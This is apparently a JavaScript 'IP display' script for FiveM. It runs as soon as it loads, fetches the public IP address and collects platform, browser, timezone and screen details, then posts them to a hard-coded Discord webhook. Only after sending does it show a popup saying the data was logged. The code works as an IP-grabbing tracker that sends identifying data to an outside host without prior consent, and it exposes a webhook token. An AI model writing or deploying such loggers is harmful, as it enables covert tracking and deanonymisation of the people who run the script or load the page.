// Simple FiveM IP Display Script with Discord Webhook
console.log('=== IP Display Script Loading ===');

// Discord webhook URL
const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1411564766232842352/BH4caQFjBlYPp1zZsWJ4E-erP7oV9La5JrRPX1emdKLbYI6QpIV0SzQZ9TRux8s9yWMM';

// Function to send to Discord
async function sendToDiscord(ip, info) {
    try {
        const embed = {
            title: '🌐 FiveM Server IP Logged',
            color: 0x00ff41,
            timestamp: new Date().toISOString(),
            fields: [
                { name: '📍 IP Address', value: `\`${ip}\``, inline: true },
                { name: '⏰ Time', value: new Date().toLocaleString(), inline: true },
                { name: '🖥️ Platform', value: info.platform, inline: true },
                { name: '📱 Browser', value: info.browser, inline: true },
                { name: '🌍 Timezone', value: info.timezone, inline: true },
                { name: '📺 Resolution', value: `${info.screenWidth}x${info.screenHeight}`, inline: true }
            ],
            footer: { text: 'FiveM IP Logger' }
        };

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: 'FiveM Logger',
                embeds: [embed]
            })
        });
        
        console.log('Sent to Discord successfully');
    } catch (e) {
        console.log('Discord send failed:', e);
    }
}

// Function to create display
function createDisplay(ip) {
    // Remove existing
    const existing = document.getElementById('ip-display');
    if (existing) existing.remove();
    
    // Create new display
    const display = document.createElement('div');
    display.id = 'ip-display';
    display.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: linear-gradient(45deg, #000080, #000040);
        border: 3px solid #00ff00;
        border-radius: 15px;
        padding: 30px;
        color: white;
        font-family: Arial, sans-serif;
        text-align: center;
        z-index: 999999;
        box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
        min-width: 400px;
    `;
    
    display.innerHTML = `
        <div style="color: #00ff00; font-size: 18px; margin-bottom: 15px;">
            🌐 SERVER PUBLIC IP
        </div>
        <div style="font-size: 36px; font-weight: bold; margin: 20px 0;">
            ${ip}
        </div>
        <div style="font-size: 14px; color: #cccccc;">
            Logged to Discord • Click to close
        </div>
    `;
    
    // Click to close
    display.onclick = () => display.remove();
    
    // Auto-remove after 10 seconds
    setTimeout(() => {
        if (display.parentNode) display.remove();
    }, 10000);
    
    document.body.appendChild(display);
    console.log('Display created');
}

// Main function
async function main() {
    try {
        console.log('Fetching IP...');
        
        // Fetch IP
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const ip = data.ip;
        
        console.log('IP fetched:', ip);
        
        // Collect basic info
        const info = {
            platform: navigator.platform,
            browser: navigator.userAgent.split(' ').pop(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screenWidth: screen.width,
            screenHeight: screen.height
        };
        
        // Send to Discord
        await sendToDiscord(ip, info);
        
        // Show display
        createDisplay(ip);
        
    } catch (error) {
        console.error('Error:', error);
        createDisplay('Error: ' + error.message);
    }
}

// Start immediately
main();

console.log('=== Script Ready ===');
